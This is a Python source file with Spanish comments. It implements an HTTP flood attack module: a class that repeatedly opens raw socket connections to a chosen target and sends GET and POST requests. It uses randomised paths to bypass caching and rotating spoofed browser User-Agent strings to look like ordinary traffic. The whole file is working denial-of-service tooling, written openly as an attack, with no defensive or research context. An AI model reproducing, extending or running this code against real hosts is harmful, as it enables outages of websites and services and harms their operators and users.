#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTTP-Flood Attack Module
Envía múltiples solicitudes HTTP GET/POST al objetivo
"""

import socket
import random
import string
from urllib.parse import urljoin


class HTTPFlood:
    """Implementa ataque HTTP-Flood"""
    
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0',
    ]

    def __init__(self, target, port=80, use_ssl=False):
        """
        Inicializa el ataque HTTP-Flood
        
        Args:
            target: IP o dominio objetivo
            port: Puerto (default 80)
            use_ssl: Usar HTTPS (default False)
        """
        self.target = target
        self.port = port
        self.use_ssl = use_ssl or port == 443
        self.timeout = 5

    def _get_random_path(self):
        """Genera una ruta aleatoria para evitar caché"""
        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        return f"/{random_str}"

    def _get_random_user_agent(self):
        """Retorna un User-Agent aleatorio"""
        return random.choice(self.USER_AGENTS)

    def _build_http_request(self, method='GET', path='/'):
        """Construye una solicitud HTTP"""
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {self.target}",
            f"User-Agent: {self._get_random_user_agent()}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Cache-Control: no-cache",
            "Pragma: no-cache",
            f"Referer: http://{self.target}/",
            "DNT: 1",
            "\r\n"
        ]
        return "\r\n".join(headers)

    def send_request(self, method='GET'):
        """
        Envía una solicitud HTTP al objetivo
        
        Args:
            method: GET o POST (default GET)
        """
        try:
            # Crear socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            # Conectar
            sock.connect((self.target, self.port))

            # Construir y enviar solicitud
            path = self._get_random_path()
            request = self._build_http_request(method, path)
            sock.sendall(request.encode())

            # Recibir respuesta (opcional)
            try:
                response = sock.recv(1024)
            except socket.timeout:
                pass

            sock.close()
            return True

        except socket.timeout:
            return False
        except ConnectionRefusedError:
            raise Exception(f"Conexión rechazada por {self.target}:{self.port}")
        except socket.gaierror:
            raise Exception(f"No se puede resolver {self.target}")
        except Exception as e:
            raise Exception(f"Error en HTTP-Flood: {e}")

    def send_post_request(self, data=None):
        """Envía una solicitud POST"""
        if data is None:
            data = ''.join(random.choices(string.ascii_letters, k=100))
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            path = self._get_random_path()
            headers = [
                f"POST {path} HTTP/1.1",
                f"Host: {self.target}",
                f"User-Agent: {self._get_random_user_agent()}",
                f"Content-Length: {len(data)}",
                "Content-Type: application/x-www-form-urlencoded",
                "Connection: close",
                "\r\n"
            ]
            
            request = "\r\n".join(headers) + data
            sock.sendall(request.encode())

            try:
                response = sock.recv(1024)
            except socket.timeout:
                pass

            sock.close()
            return True

        except Exception as e:
            raise Exception(f"Error en POST: {e}")
